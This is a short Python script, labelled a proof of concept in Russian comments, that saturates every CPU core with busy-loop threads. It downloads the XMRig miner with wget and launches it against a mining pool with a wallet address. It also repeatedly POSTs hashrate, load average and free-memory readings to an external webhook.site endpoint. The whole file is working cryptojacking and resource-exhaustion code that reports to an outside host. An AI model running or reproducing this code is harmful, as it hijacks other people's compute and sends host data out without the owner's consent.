import os
import subprocess
import json
import http.client
import time
import threading
import multiprocessing

# КОНФИГ
HOOK_DOMAIN = "webhook.site"
HOOK_PATH = "/d9ed8938-0733-4ce3-8d2c-63dab5606e87"
CORES = multiprocessing.cpu_count()

def send_payload(data):
    try:
        conn = http.client.HTTPSConnection(HOOK_DOMAIN, timeout=5)
        conn.request("POST", HOOK_PATH, json.dumps(data), {"Content-Type": "application/json"})
        conn.getresponse()
        conn.close()
    except: pass

def alu_burner():
    """Максимальная нагрузка на арифметику (ALU), не трогая RAM"""
    x = 1.1
    while True:
        x = (x * 1.1) / 1.0000001 # Бесконечный цикл Float-вычислений

def start_mining_poc():
    # 1. Тянем бинарник
    if not os.path.exists("./xmrig"):
        os.system("wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O xm.tar.gz && tar -xf xm.tar.gz && mv xmrig-6.21.0/xmrig ./xmrig")

    # 2. Запуск с агрессивными флагами для "Light" режима (раз HugePages нет)
    cmd = [
        "./xmrig", "-o", "donate.v2.xmrig.com:3333", 
        "-u", "44AFFq5kSiGBo3SBYnrYcyEC2UWXSp2B8F6K8sZ9z41YhUrX7ivU", 
        "--threads", str(CORES), "--cpu-no-yield", "--randomx-mode", "light", "--no-color"
    ]
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

if __name__ == "__main__":
    send_payload({"EVENT": "FULL_POC_START", "TARGET_CORES": CORES})

    # Шаг 1: Запускаем фоновый прожиг ядер (чтобы Load сразу ушел в CORES)
    for _ in range(CORES):
        threading.Thread(target=alu_burner, daemon=True).start()

    # Шаг 2: Запускаем майнер для фиксации хешрейта
    proc = start_mining_poc()

    # Шаг 3: Цикл мониторинга
    print(f"[*] PoC Active. Monitoring {CORES} cores...")
    while True:
        line = proc.stdout.readline()
        if "speed" in line:
            # Извлекаем хешрейт из вывода XMRig
            try:
                hashrate = line.split()[3] # Обычно 4-й элемент в строке speed
                load = os.getloadavg()
                
                # Финальный отчет на хук
                send_payload({
                    "EVENT": "FULL_EXHAUSTION_DATA",
                    "HASHRATE": f"{hashrate} H/s",
                    "LOAD_AVG": load,
                    "MEM_FREE": os.popen("free -m").read().splitlines()[1].split()[3] + "MB"
                })
            except: pass
        
        if not line and proc.poll() is not None:
            send_payload({"EVENT": "PROCESS_KILLED_BY_SYSTEM"})
            break
        time.sleep(1)
